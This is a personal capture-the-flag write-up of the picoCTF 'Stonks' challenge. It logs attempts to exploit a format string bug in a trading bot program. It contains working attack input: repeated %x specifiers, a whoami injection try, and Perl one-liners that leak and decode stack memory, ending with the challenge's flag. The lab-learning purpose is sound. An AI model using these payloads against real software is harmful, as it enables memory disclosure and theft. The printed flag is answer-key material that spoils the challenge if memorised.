# Stonks

## Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 27912

## Status

In Progress

## Done

1. Downloaded and inspected vuln.c. 
2. Accessed server with netcat - nc mercury.picoctf.net 27912.
3. Selected to buy stocks using the following API key to try a buffer overflow: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx. The system used the following xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx. Nothing happened.
4. Tried using 1s in the selection menu to prompt an error.
5. Tried using the following as API key - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
6. Tried using echo cat "api | nc mercury.picoctf.net 27912"
7. Tried using a command when the code asks for an API key: whoami.
8. Found the code has a format string vulnerablity. This vuln allows for a user to get data from memory by entering certain combinations. See https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/.
9. I created a file named api in my local machine to test how to extract its value by exploiting the string format vuln. Here is the perl one liner that is yielding promising results - ```perl -e 'print "1";print "%x";print ".%x" x 20' | ./vuln | perl -ne 'print if /1\./' | perl -ne 'my @lines = split(/\./);print @lines;' | perl -ne 'print pack("H*",$_);'```
10. Logged in to the app and entered .%x 100 times (used perl "x" to repeat the sequence to copy paste). %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
10. Possible flag? picoCTF{01a01cf2n3y_y_m0ll_m5t_4I_l0}. This is not the flag. But it is very close.
11. Modified one liner - ```perl -e 'print "1";print "%x";print ".%x" x 80' | ./vuln | perl -ne 'print if
/1\./' | perl -ne 'my @lines = split(/\./);print @lines;' | perl -ne 'print pack("H*",$_);' | perl -ne 'print scalar reverse;'```
12. Modified the one-liner again to print the stack in reverse - ```perl -ne 'my @lines = split(/\./);print reverse @lines' | perl -ne 'print pack("H*",$_)' | perl -ne 'print scalar reverse;'```. Possible flag: picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}. This did not work.
13. I noticed I was using the wrong port number for the challenge. They may have changed it since I started the challenge some time ago. The one-liner worked. This is the flag - picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}.

## Flag

picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}

## References

- https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/
- https://perldoc.perl.org/functions/pack
- https://owasp.org/www-community/attacks/Format_string_attack
- https://cs155.stanford.edu/papers/formatstring-1.2.pdf
- https://stackoverflow.com/questions/35734927/vulnerability-using-printf-scanf-and-s
